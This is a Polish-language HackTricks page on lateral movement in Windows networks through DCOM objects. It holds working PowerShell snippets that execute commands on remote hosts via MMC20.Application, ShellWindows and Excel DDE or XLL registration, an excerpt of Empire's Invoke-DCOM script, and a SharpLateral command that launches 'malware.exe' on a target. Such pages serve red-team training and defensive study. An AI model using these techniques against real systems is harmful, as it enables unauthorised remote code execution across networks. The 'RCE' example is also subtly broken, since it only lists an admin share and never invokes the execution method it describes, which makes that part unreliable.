# DCOM Exec

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## MMC20.Application

**Aby uzyskać więcej informacji na temat tej techniki, sprawdź oryginalny post z [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Obiekty Distributed Component Object Model (DCOM) oferują interesującą możliwość interakcji z obiektami w sieci. Microsoft zapewnia szczegółową dokumentację zarówno dla DCOM, jak i Component Object Model (COM), dostępną [tutaj dla DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) oraz [tutaj dla COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Lista aplikacji DCOM może być pobrana za pomocą polecenia PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Obiekt COM, [Klasa aplikacji MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), umożliwia skryptowanie operacji wtyczek MMC. Co ważne, obiekt ten zawiera metodę `ExecuteShellCommand` w `Document.ActiveView`. Więcej informacji na temat tej metody można znaleźć [tutaj](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Sprawdź jej działanie:

Funkcja ta ułatwia wykonywanie poleceń w sieci za pośrednictwem aplikacji DCOM. Aby zdalnie interagować z DCOM jako administrator, można wykorzystać PowerShell w następujący sposób:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
To polecenie łączy się z aplikacją DCOM i zwraca instancję obiektu COM. Metoda ExecuteShellCommand może być następnie wywołana w celu uruchomienia procesu na zdalnym hoście. Proces obejmuje następujące kroki:

Check methods:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Uzyskaj RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Aby uzyskać więcej informacji na temat tej techniki, sprawdź oryginalny post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Obiekt **MMC20.Application** został zidentyfikowany jako brakujący w "LaunchPermissions", domyślnie przyznając uprawnienia, które pozwalają Administratorom na dostęp. Aby uzyskać dalsze szczegóły, można zbadać wątek [tutaj](https://twitter.com/tiraniddo/status/817532039771525120), a użycie [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET do filtrowania obiektów bez wyraźnych uprawnień uruchomienia jest zalecane.

Dwa konkretne obiekty, `ShellBrowserWindow` i `ShellWindows`, zostały wyróżnione z powodu braku wyraźnych uprawnień uruchomienia. Brak wpisu rejestru `LaunchPermission` pod `HKCR:\AppID\{guid}` oznacza brak wyraźnych uprawnień.

###  ShellWindows
Dla `ShellWindows`, który nie ma ProgID, metody .NET `Type.GetTypeFromCLSID` i `Activator.CreateInstance` ułatwiają instancjonowanie obiektu przy użyciu jego AppID. Proces ten wykorzystuje OleView .NET do pobrania CLSID dla `ShellWindows`. Po zainstancjonowaniu możliwa jest interakcja za pomocą metody `WindowsShell.Item`, co prowadzi do wywołania metod, takich jak `Document.Application.ShellExecute`.

Podano przykładowe polecenia PowerShell do instancjonowania obiektu i zdalnego wykonywania poleceń:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Lateral Movement with Excel DCOM Objects

Ruch boczny można osiągnąć poprzez wykorzystanie obiektów DCOM Excel. Aby uzyskać szczegółowe informacje, zaleca się przeczytanie dyskusji na temat wykorzystania Excel DDE do ruchu bocznego za pośrednictwem DCOM na [blogu Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Projekt Empire dostarcza skrypt PowerShell, który demonstruje wykorzystanie Excela do zdalnego wykonywania kodu (RCE) poprzez manipulację obiektami DCOM. Poniżej znajdują się fragmenty skryptu dostępnego w [repozytorium GitHub Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), pokazujące różne metody nadużywania Excela do RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Narzędzia Automatyzacji dla Ruchu Lateralnego

Dwa narzędzia są wyróżnione do automatyzacji tych technik:

- **Invoke-DCOM.ps1**: Skrypt PowerShell dostarczony przez projekt Empire, który upraszcza wywoływanie różnych metod do wykonywania kodu na zdalnych maszynach. Ten skrypt jest dostępny w repozytorium Empire na GitHubie.

- **SharpLateral**: Narzędzie zaprojektowane do zdalnego wykonywania kodu, które można używać z poleceniem:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Automatic Tools

* Skrypt Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) umożliwia łatwe wywołanie wszystkich skomentowanych sposobów na wykonanie kodu na innych maszynach.
* Możesz również użyć [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## References

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
